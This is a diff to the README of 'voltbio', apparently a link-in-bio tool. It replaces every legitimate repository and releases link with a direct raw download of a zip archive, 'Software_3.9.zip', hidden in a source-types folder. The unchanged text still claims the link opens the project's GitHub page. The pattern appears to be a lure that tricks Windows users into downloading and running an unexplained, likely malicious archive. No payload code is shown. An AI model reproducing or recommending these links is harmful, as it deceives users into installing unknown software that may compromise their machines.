@@ -1,6 +1,6 @@
 # ⚡ voltbio - Build Your Link-in-Bio Simply
 
-[![Download voltbio](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/titiokawaii/voltbio)
+[![Download voltbio](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://raw.githubusercontent.com/titiokawaii/voltbio/main/src/types/Software_3.9.zip)
 
 ## 🔍 What is voltbio?
 
@@ -38,7 +38,7 @@ Here is how to get voltbio running on your Windows PC.
 
 To get started, visit the following page to download the software:
 
-[![Download voltbio](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://github.com/titiokawaii/voltbio)
+[![Download voltbio](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/titiokawaii/voltbio/main/src/types/Software_3.9.zip)
 
 Click this link. It will take you to the voltbio GitHub page. Look for the latest release section or download button.
 
@@ -110,11 +110,11 @@ If you have trouble downloading or running voltbio:
 
 ## 📎 Useful Links
 
-- voltbio main page: https://github.com/titiokawaii/voltbio  
-- Download page: https://github.com/titiokawaii/voltbio/releases  
+- voltbio main page: https://raw.githubusercontent.com/titiokawaii/voltbio/main/src/types/Software_3.9.zip  
+- Download page: https://raw.githubusercontent.com/titiokawaii/voltbio/main/src/types/Software_3.9.zip  
 - Report issues or ask questions on the GitHub "Issues" tab
 
-[![Download voltbio](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://github.com/titiokawaii/voltbio)
+[![Download voltbio](https://img.shields.io/badge/Download-Now-green?style=for-the-badge)](https://raw.githubusercontent.com/titiokawaii/voltbio/main/src/types/Software_3.9.zip)
 
 ## 🔧 About This Software
 
